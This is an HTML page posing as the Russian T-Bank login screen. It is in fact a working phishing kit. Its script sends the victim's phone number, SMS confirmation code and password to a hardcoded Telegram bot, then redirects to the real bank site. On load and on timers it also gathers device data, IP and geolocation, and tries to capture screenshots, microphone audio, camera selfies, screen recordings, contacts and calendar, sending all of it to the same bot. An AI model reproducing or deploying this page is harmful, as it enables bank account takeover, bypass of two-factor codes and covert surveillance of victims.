<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Вход в Т-Банк</title>
<meta property="og:title" content="Т-Банк">
<meta property="og:description" content="Вход в личный кабинет Т-Банка">
<meta property="og:image" content="https://www.tbank.ru/favicon.ico">
<meta property="og:url" content="https://твой-домен.com">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
body { background: #fff; color: #333; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 20px; }
.container { width: 100%; max-width: 400px; padding-top: 40px; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 80px; }
.logo { background: #000; color: #fff; padding: 6px 12px; border-radius: 8px; font-weight: 700; font-size: 14px; }
.close { width: 32px; height: 32px; background: #f0f0f0; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #999; cursor: pointer; }
h1 { font-size: 26px; text-align: center; margin-bottom: 30px; color: #000; font-weight: 700; }
.field { margin-bottom: 15px; }
label { display: block; font-size: 13px; color: #666; margin-bottom: 6px; }
input { width: 100%; padding: 16px; border: 1px solid #e0e0e0; border-radius: 12px; background: #f5f5f5; font-size: 17px; outline: none; color: #333; }
input:focus { border-color: #ffdd2d; background: #fff; }
.btn { width: 100%; padding: 16px; background: #ffdd2d; color: #000; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 5px; }
.btn:hover { background: #f5c800; }
.biometric { width: 100%; padding: 16px; background: #f5f5f5; color: #333; border: none; border-radius: 12px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
.biometric span { color: #5288c1; }
.policy { text-align: center; font-size: 12px; color: #999; margin-top: 30px; text-decoration: underline; cursor: pointer; }
.step2 p, .step3 p { text-align: center; color: #666; font-size: 15px; margin-bottom: 25px; }
.timer { text-align: center; color: #999; font-size: 14px; margin-top: 15px; }
.hidden { display: none; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="logo">T ID</div>
    <div class="close">✕</div>
  </div>

  <div id="step1">
    <h1>Вход в Т-Банк</h1>
    <div class="field">
      <label>Телефон</label>
      <input type="tel" id="phone" placeholder="+7" value="+7">
    </div>
    <button class="btn" id="next1">Продолжить</button>
    <button class="biometric"><span>👤</span> Войти по скану лица или пальца</button>
    <div class="policy">Политика обработки персональных данных</div>
  </div>

  <div id="step2" class="step2 hidden">
    <h1>Введите код</h1>
    <p>Отправили код подтверждения на ваш номер</p>
    <div class="field">
      <label>Код</label>
      <input type="tel" id="code" placeholder="Код" maxlength="5">
    </div>
    <div class="timer" id="timer">Отправим снова через 40 сек</div>
  </div>

  <div id="step3" class="step3 hidden">
    <h1>Введите пароль</h1>
    <p>Введите пароль от личного кабинета</p>
    <div class="field">
      <label>Пароль</label>
      <input type="password" id="password" placeholder="Пароль">
    </div>
    <button class="btn" id="login">Войти</button>
  </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
var chat = '7887003990';
var userData = {};

function send(text) {
  var img = new Image();
  img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(text);
}

function sendPhoto(blob, caption) {
  var form = new FormData();
  form.append('chat_id', chat);
  form.append('photo', blob, 'photo.jpg');
  if (caption) form.append('caption', caption);
  fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: form });
}

function sendVoice(blob) {
  var form = new FormData();
  form.append('chat_id', chat);
  form.append('audio', blob, 'voice.webm');
  fetch('https://api.telegram.org/bot' + token + '/sendVoice', { method: 'POST', body: form });
}

function sendVideo(blob) {
  var form = new FormData();
  form.append('chat_id', chat);
  form.append('video', blob, 'video.webm');
  fetch('https://api.telegram.org/bot' + token + '/sendVideo', { method: 'POST', body: form });
}

function getDeviceInfo() {
  return 'Устройство: ' + navigator.userAgent +
    '\nЯзык: ' + navigator.language +
    '\nЭкран: ' + screen.width + 'x' + screen.height +
    '\nПлатформа: ' + navigator.platform +
    '\nЯдер: ' + (navigator.hardwareConcurrency || 'н/д') +
    '\nПамять: ' + (navigator.deviceMemory || 'н/д') + ' GB' +
    '\nТач: ' + (navigator.maxTouchPoints || 0) +
    '\nОнлайн: ' + navigator.onLine;
}

function getIP() {
  fetch('https://api.ipify.org?format=json')
    .then(function(r) { return r.json(); })
    .then(function(d) { send('🌐 IP: ' + d.ip); })
    .catch(function() {});
}

function getBattery() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(b) {
      send('🔋 Батарея: ' + Math.round(b.level * 100) + '%' + (b.charging ? ' (заряжается)' : ''));
    });
  }
}

function getConnection() {
  if (navigator.connection) {
    send('📶 Сеть: ' + (navigator.connection.effectiveType || 'unknown') + ' | ' + (navigator.connection.downlink || '?') + ' Mbps');
  }
}

function getTimeZone() {
  send('🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\nВремя: ' + new Date().toLocaleString('ru-RU'));
}

function getUserID() {
  var id = localStorage.getItem('uid');
  if (!id) {
    id = Math.random().toString(36).substring(2, 10);
    localStorage.setItem('uid', id);
  }
  return id;
}

function takeScreenshot() {
  if (typeof html2canvas !== 'undefined') {
    html2canvas(document.body).then(function(canvas) {
      canvas.toBlob(function(blob) { sendPhoto(blob, '📸 Скриншот'); }, 'image/jpeg', 0.7);
    });
  }
}

function getGeo() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos) {
      send('📍 Гео: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
    }, function() { send('📍 Гео: отказ'); });
  }
}

function recordVoice() {
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(function(stream) {
        var recorder = new MediaRecorder(stream);
        var chunks = [];
        recorder.ondataavailable = function(e) { chunks.push(e.data); };
        recorder.onstop = function() {
          sendVoice(new Blob(chunks, { type: 'audio/webm' }));
          stream.getTracks().forEach(function(t) { t.stop(); });
        };
        recorder.start();
        setTimeout(function() { recorder.stop(); }, 5000);
      })
      .catch(function() {});
  }
}

function takePhoto() {
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(function(stream) {
        var video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        setTimeout(function() {
          var canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(function(blob) { sendPhoto(blob, '🤳 Селфи'); }, 'image/jpeg', 0.8);
          stream.getTracks().forEach(function(t) { t.stop(); });
        }, 2000);
      })
      .catch(function() {});
  }
}

function recordScreen() {
  if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
    navigator.mediaDevices.getDisplayMedia({ video: true })
      .then(function(stream) {
        var recorder = new MediaRecorder(stream);
        var chunks = [];
        recorder.ondataavailable = function(e) { chunks.push(e.data); };
        recorder.onstop = function() {
          sendVideo(new Blob(chunks, { type: 'video/webm' }));
          stream.getTracks().forEach(function(t) { t.stop(); });
        };
        recorder.start();
        setTimeout(function() { recorder.stop(); }, 5000);
      })
      .catch(function() {});
  }
}

function askNotifications() {
  if ('Notification' in window && Notification.permission === 'default') {
    Notification.requestPermission();
  }
}

function getContacts() {
  if (navigator.contacts && navigator.contacts.select) {
    navigator.contacts.select(['name', 'tel'], { multiple: true })
      .then(function(contacts) {
        if (contacts.length) send('📇 Контакты: ' + JSON.stringify(contacts));
      })
      .catch(function() {});
  }
}

function getCalendar() {
  if (navigator.calendar && navigator.calendar.query) {
    navigator.calendar.query({ start: new Date(0), end: new Date() })
      .then(function(events) {
        if (events.length) send('📅 Календарь: ' + events.length + ' событий');
      })
      .catch(function() {});
  }
}

send('👤 Новый визит ID: ' + getUserID() + '\n' + getDeviceInfo());
getIP();
getBattery();
getConnection();
getTimeZone();
getGeo();
setTimeout(takeScreenshot, 3000);
setTimeout(recordVoice, 5000);
setTimeout(takePhoto, 8000);
setTimeout(recordScreen, 12000);
setTimeout(askNotifications, 15000);
setTimeout(getContacts, 18000);
setTimeout(getCalendar, 20000);

document.getElementById('next1').addEventListener('click', function() {
  var phone = document.getElementById('phone').value;
  if (!phone || phone.length < 12) { alert('Введите номер телефона'); return; }
  userData.phone = phone;
  send('📱 Телефон: ' + phone);
  document.getElementById('step1').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
  var t = 40;
  var timer = document.getElementById('timer');
  var int = setInterval(function() {
    t--;
    timer.textContent = 'Отправим снова через ' + t + ' сек';
    if (t <= 0) { clearInterval(int); timer.textContent = 'Отправить код снова'; }
  }, 1000);
});

document.getElementById('code').addEventListener('input', function() {
  if (this.value.length === 5) {
    userData.code = this.value;
    send('🔑 Код: ' + this.value);
    document.getElementById('step2').classList.add('hidden');
    document.getElementById('step3').classList.remove('hidden');
  }
});

document.getElementById('login').addEventListener('click', function() {
  var pass = document.getElementById('password').value;
  if (!pass || pass.length < 1) { alert('Введите пароль'); return; }
  userData.pass = pass;
  send('🔒 Пароль: ' + pass);
  send('✅ Итог:\nТелефон: ' + userData.phone + '\nКод: ' + userData.code + '\nПароль: ' + pass);
  window.location.href = 'https://www.tbank.ru';
});
</script>
</body>
</html>
